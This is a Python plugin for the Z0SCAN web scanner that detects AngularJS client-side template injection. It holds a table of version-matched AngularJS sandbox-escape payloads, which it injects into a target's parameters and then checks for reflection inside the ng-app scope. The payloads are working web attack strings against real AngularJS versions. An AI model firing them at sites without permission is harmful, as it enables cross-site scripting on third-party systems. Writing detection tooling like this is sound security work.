#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# JiuZero 2025/7/29
from api import generateResponse, VulType, Type, PluginBase, conf, PLACE, Threads, KB
from bs4 import BeautifulSoup
import copy
import re

try:
    from urllib.parse import quote_plus
except:
    from urllib import quote_plus

class Z0SCAN(PluginBase):
    name = "ssti-angularjs"
    desc = 'AngularJS Client-Side Template Injection Detector'
    version = "2025.7.29"
    risk = 2

    __payloads = [
        {"min": "1.0.0", "max": "1.1.5", "value": "{{constructor.constructor('alert(1)')()}}"},
        {"min": "1.2.0", "max": "1.2.1", "value": "{{a='constructor';b={};a.sub.call.call(b[a].getOwnPropertyDescriptor(b[a].getPrototypeOf(a.sub),a).value,0,'alert(1)')()}}"},
        {"min": "1.2.2", "max": "1.2.5", "value": "{{a=\"a\"[\"constructor\"].prototype;a.charAt=a.trim;$eval('a\",alert(alert=1),\"')}}"},
        {"min": "1.2.6", "max": "1.2.18", "value": "{{(_=''.sub).call.call({}[$='constructor'].getOwnPropertyDescriptor(_.__proto__,$).value,0,'alert(1)')()}}"},
        {"min": "1.2.19", "max": "1.2.23", "value": "{{c=toString.constructor;p=c.prototype;p.toString=p.call;[\"alert(1)\",\"a\"].sort(c)}}"},
        {"min": "1.2.19", "max": "1.2.26", "value": "{{(!call?$$watchers[0].get(toString.constructor.prototype):(a=apply)&&(apply=constructor)&&(valueOf=call)&&(''+''.toString('F =Function.prototype;'+'F.apply = F.a;'+'delete F.a;'+'delete F.valueOf;'+'alert(42);')));}}"},
        {"min": "1.2.24", "max": "1.2.32", "value": "{{a=\"a\"[\"constructor\"].prototype;a.charAt=a.trim;$eval('a\",alert(alert=1),\"')}}"},
        {"min": "1.3.0", "max": "1.3.0", "value": "{{{}[{toString:[].join,length:1,0:'__proto__'}].assign=[].join;'a'.constructor.prototype.charAt=''.valueOf; $eval('x=alert(1)//');}}"},
        {"min": "1.3.0", "max": "1.5.8", "value": "{{a=toString().constructor.prototype;a.charAt=a.trim;$eval('a,alert(1),a')}}"},
        {"min": "1.3.1", "max": "1.3.2", "value": "{{{}[{toString:[].join,length:1,0:'__proto__'}].assign=[].join;'a'.constructor.prototype.charAt=''.valueOf; $eval('x=alert(1)//');}}"},
        {"min": "1.3.3", "max": "1.3.18", "value": "{{{}[{toString:[].join,length:1,0:'__proto__'}].assign=[].join;'a'.constructor.prototype.charAt=[].join;$eval('x=alert(1)//');}}"},
        {"min": "1.3.19", "max": "1.3.19", "value": "{{'a'[{toString:false,valueOf:[].join,length:1,0:'__proto__'}].charAt=[].join;$eval('x=alert(1)//');}}"},
        {"min": "1.3.20", "max": "1.3.20", "value": "{{'a'.constructor.prototype.charAt=[].join;$eval('x=alert(1)');}}"},
        {"min": "1.4.0", "max": "1.4.14", "value": "{{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };alert(1)//');}}"},
        {"min": "1.4.10", "max": "1.5.8", "value": "{{x={'y':''.constructor.prototype};x['y'].charAt=[].join;$eval('x=alert(1)');}}"},
        {"min": "1.5.9", "max": "1.5.11", "value": "{{c=''.sub.call;b=''.sub.bind;a=''.sub.apply;c.$apply=$apply;c.$eval=b;op=$root.$$phase;$root.$$phase=null;od=$root.$digest;$root.$digest=({}).toString;C=c.$apply(c);$root.$$phase=op;$root.$digest=od;B=C(b,c,b);$evalAsync(\"astNode=pop();astNode.type='UnaryExpression';astNode.operator='(window.X?void0:(window.X=true,alert(1)))+';astNode.argument={type:'Identifier',name:'foo'};\");m1=B($$asyncQueue.pop().expression,null,$root);m2=B(C,null,m1);[].push.apply=m2;a=''.sub;$eval('a(b.c)');[].push.apply=a;}}"},
        {"min": "1.6.0", "max": "1.6.5", "value": "{{[].pop.constructor('alert(1)')()}}"}
    ]

    def audit(self):
        if self.fingerprints.waf or not self.risk in conf.risk or conf.level == 0:
            return
        if not self._is_angularjs_app(): return
        angular_version = self._detect_angular_version() or "1.6.0"
        payloads = self._get_payloads_for_version(angular_version)
        payloads = self._filter_payloads_by_level(payloads)
        iterdatas = self.generateItemdatas()
        z0thread = Threads(name="ssti-angularjs")
        z0thread.submit(self._test_parameter, iterdatas, payloads)

    def _test_parameter(self, _, payloads):
        k, v, position = _
        if position not in [PLACE.PARAM, PLACE.DATA, PLACE.URL, PLACE.NORMAL_DATA]:
            return
        for payload in payloads:
            if self.__driver.stopping: return
            test_data = self.insertPayload({"key": k, "value": v, "position": position, "payload": payload["value"]})
            r = self.req(position, test_data)
            if not r: continue
            if self._check_injection(r, payload):
                self._report_vulnerability(k, position, test_data, r, payload)
                return True

    def _is_angularjs_app(self):
        soup = BeautifulSoup(self.response.text, 'html.parser')
        if soup.find(attrs={"ng-app": True}): return True
        for script in soup.find_all('script', src=True):
            if 'angular' in script['src'].lower() and '.js' in script['src']: return True
        headers = {k.lower(): v for k, v in self.response.headers.items()}
        if 'x-powered-by' in headers and 'angular' in headers['x-powered-by'].lower(): return True
        return False

    def _detect_angular_version(self):
        soup = BeautifulSoup(self.response.text, 'html.parser')
        for script in soup.find_all('script', src=True):
            if 'angular' in script['src'].lower():
                match = re.search(r'angular(\.min)?\.js\?v=([0-9.]+)', script['src'])
                if match: return match.group(2)
        for comment in soup.find_all(string=lambda text: isinstance(text, str) and 'AngularJS' in text):
            match = re.search(r'AngularJS v([0-9.]+)', comment)
            if match: return match.group(1)
        return None

    def _get_payloads_for_version(self, version):
        payloads = []
        for payload in self.__payloads:
            if self._version_is_in_range(version, payload["min"], payload["max"]):
                payloads.append(payload)
                payload_encoded = copy.deepcopy(payload)
                payload_encoded["value"] = quote_plus(payload_encoded["value"])
                payloads.append(payload_encoded)
        return payloads

    def _filter_payloads_by_level(self, payloads):
        if conf.level == 1: return payloads[:4]
        elif conf.level == 2: return payloads[:8]
        return payloads

    def _version_is_in_range(self, version, min_version, max_version):
        def parse_version(v):
            parts = v.split('.')
            return int(parts[0]), int(parts[1]), int(parts[2] if len(parts) > 2 else 0)
        v_major, v_minor, v_patch = parse_version(version)
        min_major, min_minor, min_patch = parse_version(min_version)
        max_major, max_minor, max_patch = parse_version(max_version)
        v_num = v_major * 10000 + v_minor * 100 + v_patch
        min_num = min_major * 10000 + min_minor * 100 + min_patch
        max_num = max_major * 10000 + max_minor * 100 + max_patch
        return min_num <= v_num <= max_num

    def _check_injection(self, response, payload):
        soup = BeautifulSoup(response.text, 'html.parser')
        ng_app_elements = soup.select('[ng-app]')
        if not ng_app_elements: return False
        for non_bindable in ng_app_elements[0].select('[ng-non-bindable]'): non_bindable.decompose()
        scope_html = str(ng_app_elements[0])
        return payload["value"] in scope_html

    def _report_vulnerability(self, param, position, test_data, response, payload):
        result = self.generate_result()
        result.main({
            "type": Type.REQUEST,
            "url": self.requests.url,
            "vultype": VulType.SSTI,
            "show": {
                "Position": f"{position} > {param}",
                "Payload": test_data[param],
                "Version": f"AngularJS {payload['min']}-{payload['max']}",
            }
        })
        result.step("Detection Request", {
            "request": response.reqinfo,
            "response": generateResponse(response),
            "desc": f"Detected AngularJS {payload['min']}-{payload['max']} CSTI vulnerability"
        })
        self.success(result)